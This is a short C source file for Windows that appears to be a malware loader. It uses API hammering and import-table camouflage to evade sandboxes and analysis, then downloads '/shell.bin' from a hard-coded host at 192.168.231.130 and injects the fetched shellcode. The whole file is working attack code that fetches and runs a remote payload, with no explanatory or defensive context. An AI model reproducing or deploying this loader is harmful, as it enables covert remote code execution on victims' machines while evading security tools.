#include <Windows.h>
#include "include/common.h"

int main()
{
	ApiHammering(2000);

	IatCamouflage();

	unsigned char* pPayload = NULL;
	
	PSTR url = "192.168.231.130";
	PSTR endpoint = "/shell.bin";
	
	SIZE_T sSize = Download(&pPayload, url, endpoint, FALSE);

	if (sSize == -1)
		goto _Cleanup;
	//Printing shellcode
	/*printf("[*] Shellcode: \n");
	for (SIZE_T i = 0; i < sSize; i++)
	{
		printf("%02X ", pPayload[i]);
	}
	printf("\n");*/

	if (InitiateInjection(pPayload,sSize))
	{
		return -1;
	}

_Cleanup:
	return 0;

}
